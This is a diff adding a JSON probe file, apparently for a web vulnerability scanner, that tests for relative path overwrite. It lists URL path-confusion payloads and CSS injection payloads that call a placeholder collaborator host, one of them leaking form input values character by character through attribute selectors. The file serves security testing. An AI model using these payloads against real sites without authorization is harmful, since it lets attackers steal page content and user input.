@@ -1,0 +1,63 @@
+{
+  "category": "relative_path_overwrite",
+  "contexts": {
+    "css_injection_rpo": {
+      "description": "Relative Path Overwrite -- manipulate URL path to override CSS/JS imports using relative paths, enabling CSS-based data exfiltration",
+      "tech_match": ["PHP", "ASP.NET", "IIS", "Apache", "Nginx"],
+      "param_match": ["path", "page", "url", "file", "view", "template"],
+      "probes": [
+        {
+          "payload": "{{baseline}}/swktest%2f..%2f..%2f",
+          "description": "RPO path confusion -- URL-encoded slash in path causes server to resolve different page but browser resolves relative CSS/JS from manipulated base path",
+          "matchers": [
+            {"type": "status", "status": [200]},
+            {"type": "word", "words": ["<link", "<style", "stylesheet", ".css"], "condition": "or"}
+          ],
+          "severity": "medium",
+          "confidence_boost": 35
+        },
+        {
+          "payload": "{{baseline}}/%2e%2e/%2e%2e/",
+          "description": "Double-encoded dot traversal -- server normalizes path but browser uses raw URL for relative path resolution, loading attacker-controlled CSS",
+          "matchers": [
+            {"type": "status", "status": [200]},
+            {"type": "length_diff", "min_diff": 50}
+          ],
+          "severity": "medium",
+          "confidence_boost": 30
+        },
+        {
+          "payload": "{{baseline}}/;swktest=1",
+          "description": "Semicolon path parameter -- server ignores semicolon suffix but browser includes it in base URL, breaking relative path resolution for CSS/JS imports",
+          "matchers": [
+            {"type": "status", "status": [200]},
+            {"type": "word", "words": ["<link", "<style", "stylesheet"], "condition": "or"}
+          ],
+          "severity": "medium",
+          "confidence_boost": 30
+        }
+      ]
+    },
+    "css_exfiltration": {
+      "description": "CSS-based data exfiltration via RPO -- once RPO is confirmed, inject CSS attribute selectors to steal page content character by character",
+      "tech_match": [],
+      "param_match": ["q", "search", "input", "text", "content", "style"],
+      "probes": [
+        {
+          "payload": "{}*{background:url('http://COLLABORATOR/rpo-css-{{marker}}')}",
+          "description": "CSS injection via RPO -- if page content is interpreted as CSS due to RPO, inject universal selector with Collaborator background URL",
+          "matchers": [{"type": "collaborator", "protocol": "http"}],
+          "severity": "medium",
+          "confidence_boost": 50
+        },
+        {
+          "payload": "{}input[value^='a']{background:url('http://COLLABORATOR/rpo-exfil-{{marker}}-a')}",
+          "description": "CSS attribute selector exfiltration -- steal input values one character at a time via attribute selectors in injected CSS",
+          "matchers": [{"type": "collaborator", "protocol": "http"}],
+          "severity": "medium",
+          "confidence_boost": 55
+        }
+      ]
+    }
+  }
+}
